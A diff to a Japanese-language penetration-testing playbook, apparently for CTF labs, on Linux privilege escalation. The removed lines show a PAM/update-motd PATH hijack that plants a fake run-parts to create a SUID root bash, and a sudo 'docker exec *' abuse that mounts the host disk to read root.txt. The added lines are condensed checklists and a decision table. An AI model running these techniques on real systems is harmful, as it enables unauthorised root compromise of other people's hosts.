@@ -150,41 +150,26 @@ GTFOBins で確認。標準バイナリ（find, vim, python等）に SUID が設
 
 ### `staff` グループに所属している場合（PAM PATH ハイジャック）
 
-```bash
-# 1. /usr/local/sbin への書き込み確認
-ls -la /usr/local/
+**成立条件（Playbook 側で素早く確認する 4 点）：**
+1. `id` の出力に `staff` が含まれる
+2. `ls -la /usr/local/sbin/` で書き込み権限がある（`staff` が `/usr/local` に書ける慣習）
+3. `/etc/update-motd.d/` 配下にスクリプトが存在し、フルパスなしで外部コマンド（`run-parts` 等）を呼んでいる
+4. SSH ログインを引き金にできる（自分で再ログイン可能）
 
-# 2. PAM スクリプトの確認
-ls -la /etc/update-motd.d/
-cat /etc/update-motd.d/*
+→ 詳細手順（スクリプト配置・引き金の引き方・失敗パターン）: `../03_Post_Access_Linux/PAM_Misconfig.md`
+→ 原理（なぜ PAM session が root 権限で外部コマンドを呼ぶのか）: `../06_Concepts/PAM.md`
 
-# 3. フルパスなしのコマンド呼び出しがあれば
-#    → 同名バイナリを /usr/local/sbin/ に配置
-cat > /usr/local/sbin/run-parts << 'EOF'
-#!/bin/bash
-cp /bin/bash /tmp/bash_root && chmod 4755 /tmp/bash_root
-EOF
-chmod +x /usr/local/sbin/run-parts
+### `sudo -l` に `docker exec *` の NOPASSWD がある場合（重要）
 
-# 4. SSH 再ログインを待つ（自分でログインし直してもよい）
-# 5. /tmp/bash_root -p で root シェル取得
-```
+**シグナル → 次アクション：**
 
-→ 詳細: `../03_Post_Access_Linux/PAM_Misconfig.md`
-→ 原理: `../06_Concepts/PAM.md`
+| `sudo -l` の出力 | 次に確認すること |
+|---------------|--------------|
+| `NOPASSWD: /snap/bin/docker exec *` / 同等のワイルドカード | コンテナ内 root で任意コマンド実行可能 → ホストブレイクアウトを試す |
+| `NOPASSWD: /usr/bin/docker` 無条件 | コンテナ作成から自由にできる。さらに容易 |
+| ワイルドカードなし・固定引数 | ホスト側の挙動に踏み込めないので、別経路を探す |
 
-**docker exec にワイルドカードが許可されている場合（重要）:**
+コンテナ内に入った後は「ブロックデバイス（`/dev/sda*` 等）が見えるか」で分岐する。見えればマウントでホスト全体にアクセス可能。
 
-```bash
-# sudo -l で以下が出た場合
-# (root) NOPASSWD: /snap/bin/docker exec *
-
-# コンテナ内で root として実行できる
-sudo /snap/bin/docker exec --user root [CONTAINER_ID] id
-
-# ブロックデバイスが見える場合はホスト全体にアクセス可能
-sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
-  sh -c 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && cat /mnt/host/root/root.txt'
-```
-
-→ 詳細: `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン4）
+→ 詳細手順（コンテナ内確認・マウント・root.txt の取得）: `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン4）
+→ 原理（コンテナがなぜホストデバイスにアクセスできるのか）: `../06_Concepts/Docker_Isolation.md`
